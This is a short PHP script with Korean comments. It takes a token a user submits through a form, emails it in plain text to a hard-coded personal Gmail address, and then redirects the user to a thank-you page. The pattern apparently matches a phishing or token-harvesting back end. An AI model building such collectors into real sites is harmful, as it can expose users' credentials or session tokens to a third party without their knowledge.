<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // 사용자가 입력한 토큰
    $token = $_POST["token"];

    // 이메일로 보낼 내용
    $to = "neollu75@gmail.com";
    $subject = "User Token Submission";
    $message = "User submitted token: " . $token;

    // 이메일 보내기
    mail($to, $subject, $message);

    // 사용자를 다른 페이지로 리디렉션
    header("Location: thank-you-page.html");
    exit();
}
?>
